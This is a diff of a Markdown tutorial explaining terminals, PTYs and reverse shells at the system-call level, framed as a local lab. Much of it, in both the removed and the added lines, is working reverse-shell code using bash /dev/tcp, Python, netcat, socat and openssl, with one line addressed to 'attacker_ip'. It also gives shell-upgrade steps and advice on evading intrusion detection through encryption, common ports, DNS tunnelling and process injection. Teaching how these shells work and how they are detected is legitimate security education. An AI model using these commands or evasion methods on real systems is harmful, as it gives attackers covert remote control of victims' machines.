-# PTY pair B still exists (server is still running)
-# bash is still running, connected to PTY pair B
-# You can reattach: tmux attach
-# New PTY pair A is created between new terminal and tmux client
-
-# Prove two PTY layers exist:
-tmux
-tty       # shows /dev/pts/N (tmux's PTY for bash)
-# In another terminal:
-ls /proc/$(pgrep tmux | head -1)/fd | head
-# tmux server holds MULTIPLE PTY master fds — one per window/pane
+Reverse shell (target connects out, attacker listens):
+  Attacker: nc -lvnp 4444
+  Target:   bash -i >& /dev/tcp/attacker_ip/4444 0>&1
+  Bypasses: outbound connections usually allowed through firewalls
 ```
 
----
-
-### Part 6 — Reverse Shells — Complete Exhaustive Coverage
-
-#### Every Reverse Shell Method With System Call Analysis
-
-**Method 1 — bash /dev/tcp:**
+### The Classic Bash Reverse Shell — Every Part Explained
 
 ```bash
-# On attacker machine (Terminal A)
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+```
+
+```
+bash -i
+  Start bash with -i (interactive) flag
+  Forces interactive_mode=1 even though isatty(0) will be false
+  Without -i: bash detects no TTY, runs as script, exits immediately
+
+/dev/tcp/127.0.0.1/4444
+  NOT a real file — does not exist in the filesystem
+  Bash has a built-in feature: intercepts paths matching /dev/tcp/HOST/PORT
+  Calls socket(AF_INET, SOCK_STREAM, 0) and connect() directly
+  Returns a file descriptor pointing to the TCP socket
+  Prove it is not a real file:
+    ls /dev/tcp          -> No such file or directory
+    strace confirms: socket() and connect() called, no open("/dev/tcp")
+
+>&
+  Redirect stdout (fd 1) AND stderr (fd 2) into the /dev/tcp socket fd
+  Everything bash prints goes over the network
+
+0>&1
+  Redirect stdin (fd 0) from the same place as stdout (fd 1)
+  Since stdout is now the socket, stdin is also the socket
+  Commands typed at the listener come into bash as stdin
+```
+
+After this runs:
+```
+fd 0 (stdin)  -> TCP socket to 127.0.0.1:4444
+fd 1 (stdout) -> TCP socket to 127.0.0.1:4444
+fd 2 (stderr) -> TCP socket to 127.0.0.1:4444
+```
+
+System calls made (prove with strace):
+```bash
+strace bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 2>/tmp/rs_trace.txt &
+cat /tmp/rs_trace.txt | grep -E "socket|connect|dup2"
+# socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+# connect(3, {sin_family=AF_INET, sin_port=4444, sin_addr=127.0.0.1}, 16) = 0
+# dup2(3, 1)  <- stdout = socket
+# dup2(3, 2)  <- stderr = socket
+# dup2(1, 0)  <- stdin = socket (via 0>&1)
+```
+
+### Safe Local Lab
+
+```bash
+# Terminal A — attacker listener
 nc -lvnp 4444
 
-# On target machine (Terminal B)
+# Terminal B — target
 bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
 
-# System calls made by bash (prove with strace on target):
-strace bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 2>/tmp/strace_out.txt &
-cat /tmp/strace_out.txt | grep -E "socket|connect|dup2|execve"
-# socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
-# connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr="127.0.0.1"}, 16) = 0
-# dup2(3, 1)  = 1    <- stdout = socket
-# dup2(3, 2)  = 2    <- stderr = socket
-# dup2(1, 0)  = 0    <- stdin = same socket (via 0>&1)
-# No open() for /dev/tcp — bash handles this internally
+# Terminal A now shows:
+# bash-5.1$
+# Commands you type in A execute in B's bash
 ```
 
-**Method 2 — bash /dev/udp (less common, useful when TCP is blocked):**
+### Why the Reverse Shell Is "Dumb" — No PTY, No Line Discipline
 
 ```bash
-# UDP reverse shell — no connection state, harder to detect
-# Attacker:
-nc -u -lvnp 4444
+# In the reverse shell, check isatty:
+python3 -c "import os; print(os.isatty(0))"
+# False — stdin is a TCP socket, not a PTY
 
-# Target:
-bash -i >& /dev/udp/127.0.0.1/4444 0>&1
-# Same mechanism as /dev/tcp but uses SOCK_DGRAM instead of SOCK_STREAM
-# UDP has no connection — packets may arrive out of order
-# Useful when TCP egress filtering is in place but UDP is allowed
+# Result: no line discipline
+# Ctrl-C -> sends 0x03 byte, may kill your netcat listener
+# Arrow up -> sends ESC[A characters, prints garbage
+# Tab -> sends literal tab, no completion
+# Backspace -> may not erase
+
+# Check: does it have a controlling terminal?
+# In the reverse shell:
+ls -la /proc/$$/fd | grep tty
+# Nothing — no controlling terminal
+echo $(tty)
+# not a tty
+
+# This is why sudo, vim, less break:
+# sudo calls open("/dev/tty") for password -> ENXIO (no controlling terminal)
+# vim calls ioctl(0, TIOCGWINSZ) for dimensions -> fails
+# less calls open("/dev/tty") for keypresses -> ENXIO
 ```
 
-**Method 3 — Python with full socket control:**
+### Upgrading to a Proper PTY Shell
 
 ```bash
-python3 -c "
-import socket, subprocess, os, pty
-
-# Create TCP socket
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('127.0.0.1', 4444))
-
-# Wire socket to stdin/stdout/stderr using dup2
-os.dup2(s.fileno(), 0)   # stdin
-os.dup2(s.fileno(), 1)   # stdout
-os.dup2(s.fileno(), 2)   # stderr
-
-# Execute bash — replaces this Python process
-os.execve('/bin/bash', ['/bin/bash', '-i'], os.environ)
-"
-# This is more explicit than the bash /dev/tcp trick
-# Shows exactly what dup2() and execve() do
-```
-
-**Method 4 — Python with PTY (proper interactive shell):**
-
-```bash
-python3 -c "
-import socket, os, pty
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('127.0.0.1', 4444))
-
-# os.openpty() creates a new PTY pair
-# master_fd = PTY master (we read/write this)
-# slave_fd  = PTY slave (bash gets this as its terminal)
-master_fd, slave_fd = os.openpty()
-
-# Fork bash with PTY slave as its controlling terminal
-pid = os.fork()
-if pid == 0:
-    # Child: this becomes bash
-    os.setsid()              # new session
-    os.dup2(slave_fd, 0)     # bash stdin = PTY slave
-    os.dup2(slave_fd, 1)     # bash stdout = PTY slave
-    os.dup2(slave_fd, 2)     # bash stderr = PTY slave
-    os.close(master_fd)
-    os.execve('/bin/bash', ['/bin/bash'], os.environ)
-else:
-    # Parent: ferry data between socket and PTY master
-    import select
-    while True:
-        r, _, _ = select.select([s, master_fd], [], [])
-        if s in r:
-            data = s.recv(1024)
-            os.write(master_fd, data)
-        if master_fd in r:
-            data = os.read(master_fd, 1024)
-            s.send(data)
-"
-# This reverse shell HAS a PTY
-# Ctrl-C, arrow keys, tab completion all work
-# No upgrade procedure needed
-```
-
-**Method 5 — netcat with -e (when available):**
-
-```bash
-# Traditional netcat (BSD version):
-nc -e /bin/bash 127.0.0.1 4444
-# -e flag: execute program after connection
-# nc connects, then exec()s /bin/bash with socket as stdin/stdout
-
-# Many modern systems ship ncat (nmap's netcat) or openbsd-netcat
-# which removed -e for security reasons
-# Check which you have:
-nc --help 2>&1 | grep -i "\-e\|execute"
-```
-
-**Method 6 — netcat without -e using named pipe:**
-
-```bash
-# When nc has no -e flag, use a named pipe (FIFO)
-mkfifo /tmp/f
-
-# The pipeline:
-# cat reads from /tmp/f (blocks until data arrives)
-# cat's output goes to bash's stdin
-# bash's stdout goes to nc
-# nc sends output to attacker
-# attacker types command -> nc receives -> writes to /tmp/f
-# cat reads from /tmp/f -> sends to bash stdin -> bash executes
-
-cat /tmp/f | /bin/bash -i 2>&1 | nc 127.0.0.1 4444 > /tmp/f
-
-# Proving the data flow with lsof:
-# /tmp/f is a FIFO (named pipe)
-# cat: 0=FIFO(/tmp/f), 1=pipe
-# bash: 0=pipe(from cat), 1=pipe(to nc), 2=pipe(to nc)
-# nc: 0=socket, 1=FIFO(/tmp/f)
-# Data forms a loop through the pipe and socket
-rm /tmp/f   # cleanup
-```
-
-**Method 7 — socat (most powerful, creates proper PTY):**
-
-```bash
-# Install socat if needed: sudo apt install socat
-
-# Attacker listener (creates PTY on listener side):
-socat file:$(tty),raw,echo=0 tcp-listen:4444
-
-# Target reverse shell with PTY:
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:4444
-
-# socat options explained:
-# exec:'bash -li'  = run bash interactive login
-# pty              = allocate a PTY for bash
-# stderr           = redirect stderr too
-# setsid           = new session (proper controlling terminal)
-# sigint           = pass SIGINT through properly
-# sane             = set sane terminal settings
-
-# Result: fully functional interactive shell
-# No upgrade procedure needed
-# Ctrl-C, arrow keys, tab completion, job control all work
-# This is the best reverse shell for CTFs and pentesting
-```
-
-**Method 8 — Encrypted reverse shell using openssl:**
-
-```bash
-# Why encryption matters:
-# Plain reverse shells send all commands in cleartext over the network
-# IDS/WAF can read and detect the commands
-# Network capture shows everything
-
-# Setup: generate self-signed certificate
-openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem \
-  -out /tmp/cert.pem -days 365 -nodes -subj "/CN=test"
-
-# Attacker listener (encrypts the connection):
-openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem \
-  -port 4444
-
-# Target reverse shell (connects with TLS):
-mkfifo /tmp/s
-/bin/bash -i < /tmp/s 2>&1 | \
-  openssl s_client -quiet -connect 127.0.0.1:4444 > /tmp/s
-rm /tmp/s
-
-# All data now travels encrypted over TLS
-# Signature-based IDS cannot read the commands
-# Cannot be detected by content inspection
-# Only flow analysis (connection patterns) can detect it
-```
-
----
-
-### Part 7 — Why Certain Programs Break in a Dumb Shell
-
-When a program runs in a reverse shell without a PTY, specific checks fail:
-
-#### sudo
-
-```bash
-# sudo requires a TTY for password entry (by default)
-# sudo calls isatty() on stdin — if false, it may refuse
-
-# In a dumb reverse shell:
-sudo ls
-# sudo: a terminal is required to read the password
-
-# Why: sudo uses getpass() which requires a TTY
-# getpass() opens /dev/tty directly (not stdin)
-# /dev/tty is the process's controlling terminal
-# In a dumb shell there is no controlling terminal
-# open("/dev/tty") fails with ENXIO (no such device or address)
-
-# The requiretty setting in /etc/sudoers:
-# Defaults requiretty   <- forces TTY requirement
-# Defaults !requiretty  <- allows sudo without TTY
-
-# Workaround in dumb shell (if NOPASSWD configured):
-sudo -n ls    # -n = non-interactive, never prompt
-```
-
-#### vim
-
-```bash
-# vim needs a proper terminal for cursor movement
-# In a dumb shell:
-vim /tmp/test.txt
-# vim reads terminal capabilities from TERM variable
-# vim sends escape sequences expecting cursor to move
-# Without proper PTY, escape sequences print as garbage
-# The terminal dimensions (rows/cols) are unknown
-
-# vim checks:
-# 1. isatty(0) — needs TTY for input
-# 2. TERM environment variable — needs to know terminal type
-# 3. ioctl(0, TIOCGWINSZ) — needs terminal window size
-
-# Workaround after PTY upgrade:
-export TERM=xterm-256color
-stty rows 40 cols 180
-vim /tmp/test.txt   # now works properly
-```
-
-#### less, more, man
-
-```bash
-# Pagers need a TTY to control display
-# In a dumb shell:
-ls -la | less
-# less: /dev/tty: No such device or address
-
-# less opens /dev/tty directly to read keypresses
-# separate from stdin (which has the piped data)
-# No controlling terminal = no /dev/tty = less fails
-
-# Workaround:
-cat /etc/passwd   # just use cat, no pager
-ls -la | cat      # pipe through cat to disable pager
-```
-
-#### ssh (from within a reverse shell)
-
-```bash
-# ssh needs a PTY to display passwords and handle keys
-# In a dumb reverse shell trying to ssh to another host:
-ssh user@anotherhost
-# May fail or behave strangely without TTY
-# Password prompts go to /dev/tty which does not exist
-
-# Workaround: key-based authentication + BatchMode
-ssh -o BatchMode=yes -o StrictHostKeyChecking=no user@anotherhost
-```
-
----
-
-### Part 8 — The Full PTY Upgrade Sequence Explained at Syscall Level
-
-When you get a dumb reverse shell and want to upgrade it to a proper PTY shell:
-
-```bash
-# Step 1 — Inside the dumb reverse shell:
+# Step 1: Inside the dumb reverse shell
 python3 -c "import pty; pty.spawn('/bin/bash')"
+# pty.spawn() calls os.openpty() to create a PTY pair
+# forks bash connected to the PTY slave
+# bash now has a controlling terminal
+# Press Ctrl-Z to background
 
-# What python pty.spawn() does internally:
-# 1. Calls os.openpty() -> creates PTY pair (master_fd, slave_fd)
-# 2. Calls os.fork()
-# 3. Child process:
-#      os.setsid()           <- new session, child is leader
-#      ioctl(slave_fd, TIOCSCTTY, 0)  <- set slave as controlling terminal
-#      dup2(slave_fd, 0)     <- bash stdin = PTY slave
-#      dup2(slave_fd, 1)     <- bash stdout = PTY slave
-#      dup2(slave_fd, 2)     <- bash stderr = PTY slave
-#      os.execve('/bin/bash', ...)    <- become bash
-# 4. Parent process:
-#      ferries data between original stdin/stdout and master_fd
-#      When you type -> parent reads from original stdin
-#                    -> writes to master_fd
-#                    -> line discipline processes it
-#                    -> bash reads from slave
-#      When bash outputs -> parent reads from master_fd
-#                        -> writes to original stdout
-
-# Now bash has a proper controlling terminal (the PTY slave)
-# But your netcat listener is still raw TCP
-# Arrow keys send ESC sequences that the remote PTY handles
-# but your local terminal also tries to handle them
-
-# Step 2 — Back on attacker's netcat listener:
-# Press Ctrl-Z to background netcat
-^Z
-
-# Step 3 — Set local terminal to raw mode
+# Step 2: On the attacker's netcat listener
 stty raw -echo
+# raw:   every keystroke goes directly to netcat (no local buffering)
+# -echo: stop local terminal echoing (remote bash will echo via PTY)
 
-# What stty raw -echo does:
-# raw: disables all line discipline processing on YOUR terminal
-#      every keypress is sent immediately without buffering
-#      Ctrl-C, Ctrl-Z go directly to netcat (and through to remote bash)
-# -echo: stops YOUR terminal from echoing what you type
-#        (the remote bash will echo it through the PTY instead)
-
-# Step 4 — Bring netcat back to foreground
+# Step 3:
 fg
+# Bring netcat back to foreground
+# Press Enter once to redraw the prompt
 
-# Now:
-# Your keystrokes -> your terminal (raw mode, no processing)
-#               -> netcat (immediately)
-#               -> TCP socket
-#               -> remote bash's PTY master
-#               -> remote PTY line discipline (processes Ctrl-C etc)
-#               -> remote bash reads from PTY slave
-# This is exactly like a proper SSH session
-
-# Step 5 — Fix terminal dimensions on remote side
+# Step 4: Fix terminal dimensions in the upgraded shell
 stty rows $(tput lines) cols $(tput cols)
 export TERM=xterm-256color
-
-# Why dimensions matter:
-# vim, less, htop all call ioctl(0, TIOCGWINSZ) to get terminal size
-# If the PTY was created with 0x0 dimensions, they render incorrectly
-# Setting rows and cols tells the PTY what dimensions to report
+# Now arrow keys, Ctrl-C, tab completion, vim all work
 ```
 
----
-
-### Part 9 — IDS Detection and Evasion of Reverse Shells
-
-Understanding how reverse shells are detected informs both defence and penetration testing:
-
-#### How IDS Detects Reverse Shells
-
-```
-Signature-based detection (Snort/Suricata):
-  Pattern: /bin/bash, /bin/sh in network payload
-  Pattern: "bash -i" in cleartext TCP stream
-  Pattern: known reverse shell command strings
-
-  Snort rule example:
-  alert tcp any any -> any any (
-    msg:"Possible Reverse Shell";
-    content:"/bin/bash"; nocase;
-    content:"-i"; distance:1; within:5;
-    sid:9000001;
-  )
-
-Flow-based detection:
-  Outbound TCP connection to unusual port (not 80/443/22)
-  Long-lived TCP connection with low volume bidirectional traffic
-  Connection from server process (web server connecting out)
-  Beaconing pattern (periodic connections at fixed intervals)
-
-Behaviour-based detection:
-  Web server process spawning a shell (nginx -> bash)
-  Process with network connection and shell in process tree
-  Environment variables typical of shells appearing in network processes
-```
-
-#### Evasion Techniques
+### All Reverse Shell Methods
 
 ```bash
-# 1. Use common ports that are allowed outbound
-bash -i >& /dev/tcp/attacker/443 0>&1    # HTTPS port
-bash -i >& /dev/tcp/attacker/53 0>&1     # DNS port
-bash -i >& /dev/tcp/attacker/80 0>&1     # HTTP port
+# 1. bash /dev/tcp (no tools needed)
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
 
-# 2. Encrypt the traffic (defeats content inspection)
-# Use the openssl method from Part 6
+# 2. bash /dev/udp (when TCP egress is blocked)
+bash -i >& /dev/udp/127.0.0.1/4444 0>&1
 
-# 3. Use DNS for exfiltration (bypasses most firewalls)
-# DNS queries are allowed almost everywhere
-# Encode commands in DNS queries, exfiltrate data in DNS responses
-# Tools: dnscat2, iodine
+# 3. Python (explicit dup2 — most educational)
+python3 -c "
+import socket,os
+s=socket.socket()
+s.connect(('127.0.0.1',4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+os.execve('/bin/bash',['/bin/bash','-i'],os.environ)"
 
-# 4. Use legitimate protocols
-# Reverse shell over HTTP (looks like web traffic)
-# Reverse shell over WebSockets
-# Tools: Metasploit HTTPS meterpreter, Cobalt Strike HTTP beacon
+# 4. netcat with -e (when available)
+nc -e /bin/bash 127.0.0.1 4444
 
-# 5. socat with SSL (encrypted + legitimate-looking)
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane \
-  OPENSSL:attacker_ip:4444,cert=/tmp/cert.pem,cafile=/tmp/cert.pem
+# 5. netcat without -e — named pipe trick
+mkfifo /tmp/f
+cat /tmp/f | bash -i 2>&1 | nc 127.0.0.1 4444 > /tmp/f
+# Data loop: nc receives -> writes to /tmp/f -> cat reads ->
+# bash executes -> output -> nc sends -> attacker sees
+
+# 6. socat — proper PTY, best option for interactive use
+# Attacker:
+socat file:$(tty),raw,echo=0 tcp-listen:4444
+# Target:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:4444
+# Result: fully interactive shell with PTY, no upgrade needed
+
+# 7. openssl — encrypted (evades content-inspection IDS)
+# Setup once:
+openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem \
+  -out /tmp/cert.pem -days 365 -nodes -subj "/CN=test"
+# Attacker:
+openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem -port 4444
+# Target:
+mkfifo /tmp/s
+bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:4444 > /tmp/s
 ```
 
----
+### Why Programs Break in a Dumb Shell
 
-### Part 10 — Meterpreter vs Raw Reverse Shell
+```
+sudo:
+  Calls open("/dev/tty") to read password
+  No controlling terminal -> ENXIO -> "sudo: a terminal is required"
+  Workaround: sudo -n (non-interactive, requires NOPASSWD in sudoers)
 
-A **Meterpreter** shell (from Metasploit) is fundamentally different from a raw bash reverse shell:
+vim:
+  Calls ioctl(0, TIOCGWINSZ) to get terminal dimensions
+  Without PTY: returns 0x0 -> vim renders incorrectly
+  After upgrade: set TERM and stty rows/cols to fix
+
+less / man / more:
+  Opens /dev/tty directly for reading keypresses (separate from piped data)
+  No controlling terminal -> ENXIO -> fails immediately
+  Workaround: use cat instead, or PAGER=cat
+
+ssh (from within dumb shell):
+  Needs /dev/tty for password prompts
+  Workaround: key-based auth + ssh -o BatchMode=yes
+```
+
+### Meterpreter vs Raw Reverse Shell
 
 ```
 Raw reverse shell (bash -i >& /dev/tcp/...):
-  Bash process running on target
-  All commands visible in process list: ps aux shows /bin/bash
-  Commands sent as plaintext (unless encrypted)
-  Shell limited to what bash can do
-  Leaves bash in process list
-  Write to disk: yes (bash binary already there)
+  Creates a new bash process visible in: ps aux | grep bash
+  Commands sent as plaintext (unless openssl used)
+  Limited to bash capabilities
+  Detected by: process name, network connection from shell process
 
-Meterpreter:
-  Runs entirely in memory — no files written to disk
-  Injected as shellcode into an existing process
-  Encrypted communications (TLS by default)
-  Extends functionality via in-memory plugins
-  Can migrate to other processes (changes PID)
-  Staged: small initial payload downloads full agent
-  ps aux shows the HOST process (e.g., svchost.exe), not meterpreter
-  Has: file download/upload, screenshot, keylogger, port forward
-       without ever spawning a shell process visible in ps
+Meterpreter (Metasploit):
+  Runs entirely in memory — no new process for the shell
+  Injected as shellcode into an existing process (e.g. apache2)
+  Encrypted by default (TLS)
+  Capabilities: file transfer, screenshot, keylogger, port forward,
+                pivot to other hosts, in-memory plugin loading
+  Detected by: network connection from unexpected process,
+               memory signatures
+  ps aux shows: apache2 (the host process), not meterpreter
 
 Architecture:
-  Stage 1 (stager): tiny shellcode that calls socket()+connect()
-                    downloads stage 2 over the connection
-  Stage 2 (agent):  full meterpreter DLL/shared library
-                    loaded entirely into memory
-                    implements a rich RPC protocol over TLS
-
-From the target OS perspective:
-  One process (the injected one) has an extra TCP connection
-  No bash, no python, no extra processes
-  Much harder to detect than a bash reverse shell
+  Stager: tiny shellcode -> socket() + connect() -> download agent
+  Agent:  full meterpreter DLL/SO loaded into memory
+          implements rich RPC protocol over TLS
+          never touches disk
 ```
 
 ---
 
-### The Complete Mental Model — All Cases
+## IDS Detection and Evasion
 
 ```
-TERMINAL          SHELL          PROMPT     BEHAVIOUR
-─────────────     ────────       ──────     ─────────────────────────
-PTY (xterm)       bash           PS1 str    Normal interactive session
-PTY (xterm)       python3        ">>> "     Python REPL, no shell
-PTY (xterm)       top            (none)     top UI, no shell at all
-PTY (xterm)       cat            (none)     echo mode, no shell
-None (file)       bash           (none)     Script mode, silent
-None (pipe)       bash           (none)     Script mode, silent
-None (socket)     bash -i        PS1 str    Dumb reverse shell
-PTY (socat)       bash -i        PS1 str    Proper reverse shell
-None (socket)     meterpreter    N/A        In-memory agent, no shell
-PTY (tmux)        bash           PS1 str    Multiplexed session
-PTY (ssh-remote)  bash           PS1 str    Remote session via network
+Signature detection (content inspection):
+  Looks for: "/bin/bash", "bash -i", known reverse shell strings
+  Evasion: encrypt with openssl, use obfuscated encoding
 
-Key variables:
-  isatty(0) true  = interactive mode = PS1 printed
-  isatty(0) false = script mode = no PS1
-  PTY present     = line discipline active = Ctrl-C, arrow keys work
-  PTY absent      = raw bytes only = "dumb shell"
-  Controlling terminal present = /dev/tty works = sudo, vim work
-  Controlling terminal absent  = /dev/tty fails = sudo, vim break
+Flow detection (behaviour analysis):
+  Looks for: long-lived TCP connection with low bidirectional traffic
+             server process initiating outbound connection
+             unusual ports for outbound connections
+  Evasion: use ports 80, 443, 53 (commonly allowed outbound)
+           mimic legitimate protocol patterns
+
+Process detection (host-based):
+  Looks for: web server spawning a shell
+             shell process with network socket fd
+  Evasion: inject into existing process (meterpreter approach)
+           use living-off-the-land binaries (lolbins)
+
+Common evasion ports:
+  443  (HTTPS — encrypted traffic expected)
+  80   (HTTP — allowed almost everywhere)
+  53   (DNS — allowed almost everywhere, use dnscat2 for DNS shells)
+  8080 (HTTP alternate — commonly allowed)
+```
+
+---
+
+## The Complete Mental Model
+
+```
+WHAT EACH COMPONENT NEEDS:
+
+Shell needs:
+  fd 0 (stdin)   — source of commands  — can be file, pipe, socket, PTY
+  fd 1 (stdout)  — destination of output — can be anything
+  fd 2 (stderr)  — destination of errors — can be anything
+  Does NOT need: a terminal, a PTY, a prompt, or a human
+
+Terminal needs:
+  A program to run on the PTY slave — can be anything
+  Does NOT need: that program to be a shell
+
+Prompt needs:
+  isatty(0) to return true (or -i flag to force interactive mode)
+  PS1 variable to be non-empty
+  Does NOT exist at all in non-interactive mode
+
+PTY needs:
+  A master holder (terminal emulator, tmux server, socat)
+  A slave holder (whatever program runs: bash, python, top, cat)
+  Does NOT need: both sides to be related in any particular way
+
+Line discipline needs:
+  A PTY to be attached to
+  Does NOT exist on plain pipes or sockets (why dumb shells are dumb)
+
+CASE TABLE:
+Case                            Terminal  Shell  Prompt  PTY  Line disc
+──────────────────────────────  ────────  ─────  ──────  ───  ─────────
+Normal terminal + bash          yes       yes    yes     yes  yes
+Terminal + python3              yes       no     no*     yes  yes
+Terminal + top                  yes       no     no      yes  yes
+bash script.sh                  no        yes    no      no   no
+echo cmd | bash                 no        yes    no      no   no
+bash -c 'cmd'                   no        yes    no      no   no
+Reverse shell (dumb)            no        yes    yes**   no   no
+Reverse shell (socat PTY)       no        yes    yes     yes  yes
+tmux session                    yes***    yes    yes     yes  yes
+SSH without -t                  no        yes    no      no   no
+SSH with -t                     yes       yes    yes     yes  yes
+
+* Python has its own >>> prompt
+** bash -i forces prompt but no line discipline
+*** two PTY layers: terminal->tmux and tmux->bash
 ```
 
 
